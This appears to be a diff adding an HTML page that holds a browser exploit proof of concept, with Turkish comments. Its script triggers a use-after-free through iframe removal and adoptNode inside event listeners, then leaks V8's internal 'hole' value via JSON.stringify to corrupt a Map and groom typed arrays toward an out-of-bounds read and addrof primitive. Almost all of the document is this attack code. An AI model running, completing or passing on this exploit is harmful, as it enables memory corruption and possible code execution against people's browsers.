@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<body>
+<button onclick="main()">Trigger UAF + addrof</button>
+<script>
+function main() {
+    const f = document.body.appendChild(document.createElement('iframe'));
+
+    const a = document.createElement('div');
+    const b = a.appendChild(document.createElement('div'));
+
+    a.addEventListener('a', eval(`(function () {
+        document.adoptNode(a);
+        f.remove();
+
+        throw {
+            line: 1,
+            column: 1,
+            sourceURL: 'A'.repeat(1024 * 1024 * 32) + 'A'.repeat(1024 * 1024 * 32)
+        };
+    })`));
+
+    a.addEventListener('a', () => {});
+
+    b.addEventListener('a', () => {
+        f.contentDocument.adoptNode(a);
+    });
+
+    b.dispatchEvent(new Event('a', { bubbles: true }));
+
+    // ========== UAF SONRASI GROOMING ==========
+    // TheHole için gerekli yapılar
+    let hole = null;
+    let a2 = [], b2 = [];
+    let s = 'A'.repeat(0x80000);
+    a2[20000] = s;
+    for (let i = 0; i < 10; i++) a2[i] = s;
+    for (let i = 0; i < 10; i++) b2[i] = a2;
+    try {
+        JSON.stringify(b2);
+    } catch (e) {
+        hole = e;
+    }
+
+    let map = new Map();
+    map.set(1, 1);
+    map.set(hole, 1);
+    map.delete(hole);
+    map.delete(hole);
+    map.delete(1);
+    map.set(0x10, -1);
+
+    let oob_arr = new BigUint64Array(0x20);
+    let victim_arr = new BigUint64Array(2);
+    let obj_arr = new Array({}, {});
+
+    // Bu indeksleri test ederek bul
+    // alert("UAF tetiklendi, addrof indeksini bulmak için oob_arr[39] gibi değerleri kontrol et");
+    console.log("[*] UAF + grooming tamamlandı, şimdi addrof indeksini bul");
+    send_notification("UAF tetiklendi, grooming yapıldı");
+}
+</script>
+</body>
+</html>
